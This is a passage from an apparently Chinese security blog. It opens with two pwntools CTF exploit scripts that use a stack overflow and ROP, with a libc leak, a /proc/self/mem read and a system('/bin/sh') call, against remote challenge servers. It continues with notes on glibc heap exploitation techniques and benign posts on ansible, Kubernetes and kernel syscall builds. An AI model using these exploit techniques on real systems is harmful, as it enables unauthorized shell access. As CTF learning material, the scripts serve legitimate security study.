class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io2 = process(<span class="string">'./play'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io2 = remote(<span class="string">'47.104.90.157'</span>, <span class="number">30003</span>)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io2.recvuntil(<span class="string">'login:'</span>)</span><br><span class="line">io2.sendline(name)</span><br><span class="line">io2.recvuntil(<span class="string">'choice&gt;&gt; '</span>)</span><br><span class="line">io2.close()</span><br><span class="line">hacking(<span class="number">1</span>)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./play'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(elf.plt[<span class="string">'write'</span>]) + p32(<span class="number">0x80492C0</span>) + p32(<span class="number">1</span>) +</span><br><span class="line">p32(elf.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>))</span><br><span class="line">io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_addr + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br><span class="line">log.info(<span class="string">'bin_sh:%#x'</span> % bin_sh)</span><br><span class="line">attack2()</span><br><span class="line">io.recvuntil(<span class="string">'what\'s your name:'</span>)</span><br><span class="line">io.sendline(<span class="string">'A'</span> * <span class="number">0x4c</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh))</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">io = process(<span class="string">'./fileManager'</span>, aslr=<span class="keyword">False</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:</span><br><span class="line"><span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x56555F2C\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">'47.104.188.138'</span>, <span class="number">30007</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mod</span><span class="params">(name, offset, size)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'1'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\xae\xb9'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_mod</span><span class="params">(name, offset, size, content)</span>:</span></span><br><span class="line">io.recvuntil(<span class="string">'\x87\xba\n'</span>)</span><br><span class="line">io.sendline(<span class="string">'2'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'\xa7\xb0\x3a'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.recvuntil(<span class="string">'\x87\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(offset))</span><br><span class="line">io.recvuntil(<span class="string">'\xb0\x8f\x3a'</span>)</span><br><span class="line">io.sendline(str(size))</span><br><span class="line">io.recvuntil(<span class="string">'\x9d\x97\x3a'</span>)</span><br><span class="line">io.send(content)</span><br><span class="line">name = <span class="string">'B1rd'</span></span><br><span class="line">io.recvuntil(<span class="string">'FTP:'</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">read_mod(<span class="string">'/proc/self/maps'</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">elf_base = int(io.recvn(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'elf_base:%#x'</span> % elf_base)</span><br><span class="line">elf = ELF(<span class="string">'fileManager'</span>)</span><br><span class="line">read_mod(<span class="string">'/proc/self/mem'</span>, elf_base + elf.got[<span class="string">'open'</span>], <span class="number">0x100</span>)</span><br><span class="line">libc_addr = u32(io.recvn(<span class="number">4</span>)) - libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'libc_addr:%#x'</span> % libc_addr)</span><br><span class="line">log.info(<span class="string">'system_addr:%#x'</span> % system_addr)</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.131Z"><a href="/2018/10/21/堆溢出/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/堆溢出/">堆溢出</a></h1>
  

    </header>
    <div class="entry">
      
        <p>House of Prime<br>House of Mind<br>House of Force<br>House of Lore<br>House of Spirit<br>House of Mind</p>
<h1 id="House-of-Mind"><a href="#House-of-Mind" class="headerlink" title="House of Mind"></a>House of Mind</h1><p>这个技巧中，攻击者欺骗 glibc malloc 来使用由他伪造的 arena。伪造的 arena 以这种形式构造，unsorted bin 的 fd 包含free的 GOT 条目地址 -12。因此现在当漏洞程序释放某个块的时候，free的 GOT 条目被覆盖为 shellcode 的地址。在成功覆盖 GOT 之后，当漏洞程序调用free，shellcode 就会执行。</p>
<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
<h1 id="House-of-Force-1"><a href="#House-of-Force-1" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>在这个技巧中，攻击者欺骗 glibc malloc 来返回一个块，它位于栈中（而不是堆中）。这允许攻击者覆盖储存在栈中的返回地址。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.130Z"><a href="/2018/10/21/分布式/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/分布式/">分布式搭建</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="ansible安装"><a href="#ansible安装" class="headerlink" title="ansible安装"></a>ansible安装</h1><h2 id="安装ansible"><a href="#安装ansible" class="headerlink" title="安装ansible"></a>安装ansible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">virtualenv --no-site-packages venv</span><br><span class="line">source venv/bin/active</span><br><span class="line">pip install ansbile</span><br></pre></td></tr></table></figure>
<p>ansbile主机配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[test]</span><br><span class="line">127.0.0.1 ansible_ssh_user=aaa ansible_ssh_port=22 ansible_ssh_pass=aaa</span><br></pre></td></tr></table></figure>
<p>注释这么配置不好，但初始这样配置，为了之后批量分发，分发后请删除这个账户</p>
<p>ansbile批量推送公钥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"> ansible-playbook   -i hosts   ssh.yml</span><br></pre></td></tr></table></figure>
<p>推送文件ssh.yml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Using alternate directory locations:</span><br><span class="line"> - hosts: test</span><br><span class="line">   user: aaa</span><br><span class="line">   tasks:</span><br><span class="line">    - name: ssh-copy</span><br><span class="line">      authorized_key: user=aaa key=&quot;&#123;&#123; lookup(&apos;file&apos;, &apos;/home/aaa/.ssh/id_rsa.pub&apos;) &#125;&#125;&quot;</span><br><span class="line">      tags:</span><br><span class="line">        - sshkey</span><br></pre></td></tr></table></figure>
<p>执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible  test -i ./hosts  -m command -a &quot;echo &apos;aa&apos;&quot;</span><br></pre></td></tr></table></figure>
<h1 id="k8s安装（需要翻墙）"><a href="#k8s安装（需要翻墙）" class="headerlink" title="k8s安装（需要翻墙）"></a>k8s安装（需要翻墙）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y apt-transport-https curl</span><br><span class="line">curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add -</span><br><span class="line">cat &lt;&lt;EOF &gt;/etc/apt/sources.list.d/kubernetes.list</span><br><span class="line">deb https://apt.kubernetes.io/ kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y kubelet kubeadm kubectl kubernetes-cni docker.io </span><br><span class="line">apt-mark hold kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure>
<p>配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: kubeadm.k8s.io/v1alpha2</span><br><span class="line">kind: MasterConfiguration</span><br><span class="line">api:</span><br><span class="line">  advertiseAddress: 0.0.0.0</span><br><span class="line">networking:</span><br><span class="line">  podSubnet: 10.244.0.0/16</span><br><span class="line">etcd:</span><br><span class="line">  image: registry.cn-hangzhou.aliyuncs.com/google_containers/etcd-amd64:3.1.11</span><br><span class="line">kubernetesVersion: v1.12.1</span><br><span class="line">imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers</span><br><span class="line"></span><br><span class="line">imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo swapoff -a</span><br><span class="line">　1. 为docker服务创建一个内嵌的systemd目录</span><br><span class="line"></span><br><span class="line">$ mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line"></span><br><span class="line">　　2. 创建/etc/systemd/system/docker.service.d/http-proxy.conf文件，并添加HTTP_PROXY环境变量。其中[proxy-addr]和[proxy-port]分别改成实际情况的代理地址和端口：</span><br><span class="line">　　</span><br><span class="line">[Service]</span><br><span class="line">Environment=&quot;HTTP_PROXY=http://[proxy-addr]:[proxy-port]/&quot; &quot;HTTPS_PROXY=http://[proxy-addr]:[proxy-port]/&quot;</span><br><span class="line">$ systemctl daemon-reload</span><br><span class="line">$ systemctl restart docker</span><br><span class="line">sudo kubeadm init --config ./kubeadm.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/k8s-manifests/kube-flannel-legacy.yml</span><br><span class="line">需要安装flannel</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.129Z"><a href="/2018/10/21/内核编译/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/内核编译/">内核编译</a></h1>
  

    </header>
    <div class="entry">
      
        <p>原文muhe，有些地方有改动</p>
<h1 id="0x01-环境说明"><a href="#0x01-环境说明" class="headerlink" title="0x01: 环境说明"></a>0x01: 环境说明</h1><p>ubuntu 14.04 x86<br>qemu<br>使用的内核版本2.6.32.1</p>
<p>busybox版本1.19.4</p>
<p>使用busybox是因为文件添加方便.</p>
<h1 id="0x02-内核编译并测试"><a href="#0x02-内核编译并测试" class="headerlink" title="0x02: 内核编译并测试"></a>0x02: 内核编译并测试</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://www.kernel.org/pub/linux/kernel/v2.6/linux-2.6.32.1.tar.gz -O linux-2.6.32.1.tar.gz</span><br><span class="line">$ tar -xvf linux-2.6.32.1.tar.gz</span><br></pre></td></tr></table></figure>
<p>首先要安装一些依赖库以及qemu。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-2.6.32.1/</span><br><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ sudo apt-get install qemu qemu-system</span><br><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">make bzImage </span><br><span class="line">$ make modules</span><br><span class="line">64位安32位</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">make ARCH=i386 menuconfig   </span><br><span class="line">make ARCH=i386   </span><br><span class="line">make ARCH=i386 modules_install   </span><br><span class="line">make ARCH=i386 install</span><br></pre></td></tr></table></figure></p>
<h1 id="0x03-增加syscall"><a href="#0x03-增加syscall" class="headerlink" title="0x03:增加syscall"></a>0x03:增加syscall</h1><p>增加syscall的方式和之前文章写的差不多，<br>只是这次内核版本更低，所以更简单一点。我这里添加了两个系统调用进去。</p>
<h2 id="1-在syscall-table中添加信息"><a href="#1-在syscall-table中添加信息" class="headerlink" title="1. 在syscall table中添加信息"></a>1. 在syscall table中添加信息</h2><p>文件 arch/x86/kernel/syscall_table_32.S中添加自己的调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.long sys_muhe_test</span><br><span class="line">.long sys_hello</span><br></pre></td></tr></table></figure>
<h2 id="2-定义syscall的宏"><a href="#2-定义syscall的宏" class="headerlink" title="2. 定义syscall的宏"></a>2. 定义syscall的宏</h2><p>文件arch/x86/include/asm/unistd_32.h中添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_hello 337</span><br><span class="line">#define __NR_muhe_test    338</span><br><span class="line">#ifdef __KERNEL__</span><br><span class="line">#define NR_syscalls 339</span><br></pre></td></tr></table></figure>
<p>要注意NR_syscalls要修改成现有的调用数目，<br>比如原来有0~336一共337个调用，<br>现在增加了两个，那就改成339。</p>
<h2 id="3-添加函数定义"><a href="#3-添加函数定义" class="headerlink" title="3. 添加函数定义"></a>3. 添加函数定义</h2><p>文件include/linux/syscalls.h</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage long sys_muhe_test(int arg0);</span><br><span class="line">asmlinkage long sys_hello(void);</span><br></pre></td></tr></table></figure>
<h2 id="4-编写syscall代码"><a href="#4-编写syscall代码" class="headerlink" title="4. 编写syscall代码"></a>4. 编写syscall代码</h2><p>新建目录放自定义syscall的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test [2:43:06] </span><br><span class="line">$ cat muhe_test.c</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_muhe_test</span><span class="params">(<span class="keyword">int</span> arg0)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">"I am syscall"</span>);</span><br><span class="line">    printk(<span class="string">"syscall arg %d"</span>,arg0);</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">long</span>)arg0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_hello</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">"hello my kernel worldn"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test [2:43:12] </span><br><span class="line">$ cat Makefile</span><br><span class="line">obj-y := muhe_test.o</span><br></pre></td></tr></table></figure>
<h2 id="5-修改Makefile"><a href="#5-修改Makefile" class="headerlink" title="5. 修改Makefile"></a>5. 修改Makefile</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [2:44:59] </span><br><span class="line">$ cat Makefile| grep muhe</span><br><span class="line">core-y        += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ muhe_test/</span><br></pre></td></tr></table></figure>
<h2 id="6-编译"><a href="#6-编译" class="headerlink" title="6. 编译"></a>6. 编译</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j2</span><br></pre></td></tr></table></figure>
<h1 id="0x04-busybox编译配置"><a href="#0x04-busybox编译配置" class="headerlink" title="0x04: busybox编译配置"></a>0x04: busybox编译配置</h1><p>下载 busybox-1.20.1.tar.bz2:</p>
<p>wget   <a href="http://www.busybox.net/downloads/busybox-1.20.1.tar.bz2" target="_blank" rel="noopener">http://www.busybox.net/downloads/busybox-1.20.1.tar.bz2</a></p>
<p>编译</p>
<p>busybox用常规中的二进制编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br></pre></td></tr></table></figure>
<p>编译完成之后如下配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#将 proc 文件系统挂载到 /proc 目录中</span><br><span class="line">mount -t proc none /proc/</span><br><span class="line">#用于对内存控制与对驱动操作</span><br><span class="line">#将 sys 文件系统挂载到 /sys 的目录上</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">#mdev 是 busybox 自带的一个 udev ，它是用于系统启动和</span><br><span class="line">#热插拔或是动态加载驱动程序的时候，而自动产生设别节点的，</span><br><span class="line">#这句话如果不加上的话，这需要手动的 mknod 来挂载设备节点</span><br><span class="line">/sbin/mdev -s</span><br></pre></td></tr></table></figure>
<p>nano /etc/init</p>
<p>实际只要examples/inittab注释掉一些tty2::askfirst:-/bin/sh类似的行就可以了，因为我们只要一个控制台就可以了，文件内容只如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line"></span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line"></span><br><span class="line">::restart:/sbin/init</span><br><span class="line"></span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line"></span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line"></span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir dev</span><br><span class="line">sudo mknod dev/ttyAMA0 c 204 64</span><br><span class="line">sudo mknod dev/null c 1 3</span><br><span class="line">sudo mknod dev/console c 5 1</span><br><span class="line">$ find . | cpio -o --format=newc &gt; ./rootfs.img</span><br><span class="line">gzip -c rootfs.img &gt; rootfs.img.gz</span><br><span class="line"> </span><br><span class="line">$ qemu-system-i386 -kernel bzImage -initrd rootfs.img.gz -append &quot;root=/dev/ram rdinit=/sbin/init&quot;</span><br><span class="line">http://p0.qhimg.com/t016ecb6e221f21933d.png</span><br></pre></td></tr></table></figure>
<p>0x05: 测试系统调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [2:45:04] </span><br><span class="line">$ cd muhe_test_syscall_lib </span><br><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test_syscall_lib [2:51:48] </span><br><span class="line">$ cat muhe_test_syscall_lib.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;linux/unistd.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">int main(int argc,char **argv)</span><br><span class="line">&#123;</span><br><span class="line">        printf(&quot;n Diving to kernel levelnn&quot;);</span><br><span class="line">        syscall(337,1337);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/muhe_test_syscall_lib [2:51:51] </span><br><span class="line">$ gcc muhe_test_syscall_lib.c -o muhe -static</span><br></pre></td></tr></table></figure>
<p>一定要静态链接，因为你进busybox链接库那些是没有的。<br>这里要注意，每次拷贝新文件到busybox的文件系统中去，<br>都要执行find . | cpio -o –format=newc &gt; ../rootfs.img去生成新的rootfs。</p>
<p>然后qemu起系统</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1 [2:53:33] </span><br><span class="line">$  qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd ../busybox-1.19.4/rootfs.img -append &quot;root=/dev/ram rdinit=/sbin/init&quot;</span><br><span class="line">http://p2.qhimg.com/t019e8e38063f5ebdac.png</span><br></pre></td></tr></table></figure>
<p>制作initrd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[cpp] view plain copy</span><br><span class="line"><span class="comment">/*hello.c*/</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World\n"</span>);  </span><br><span class="line">　　<span class="comment">/*强制刷新输出，不然可能打印不出来*/</span>  </span><br><span class="line">    fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>initrd吧，全称是initial ramdisk,在内核启动的时候会先去加载的一种文件系统．</p>
